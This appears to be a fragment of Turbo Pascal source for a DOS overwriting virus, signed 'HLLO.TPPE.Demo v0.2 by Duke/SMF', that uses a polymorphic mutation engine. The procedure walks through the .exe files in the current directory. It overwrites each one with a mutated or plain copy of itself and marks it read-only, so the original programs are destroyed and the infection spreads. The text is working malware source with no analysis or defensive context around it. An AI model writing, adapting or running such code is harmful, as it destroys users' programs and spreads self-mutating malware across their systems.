   procedure Starting;
   var s:searchrec;
   begin
   {$IFOPT S+}TPPE_Init;{$ENDIF}
   findfirst('*.exe',$20,s);
   {$IFOPT S-}TPPE_Init;{$ENDIF}
   while doserror=0 do
     begin
     if DetectComp then
       begin
       TPPE_Mutation;
       exec(Command,'/c ren _tppe_.exe '+s.name+'>nul')
       end
     else exec(Command,'/c copy '+paramstr(0)+' '+s.name+'>nul');
     exec(Command,'/c attrib +r '+s.name+'>nul');
     findnext(s);
     end;
   {$IFOPT N-}TPPE_Close;{$ENDIF}
   Command:='[HLLO.TPPE.Demo v0.2 by Duke/SMF]';
   {$IFOPT N+}TPPE_Close;{$ENDIF}
   end;
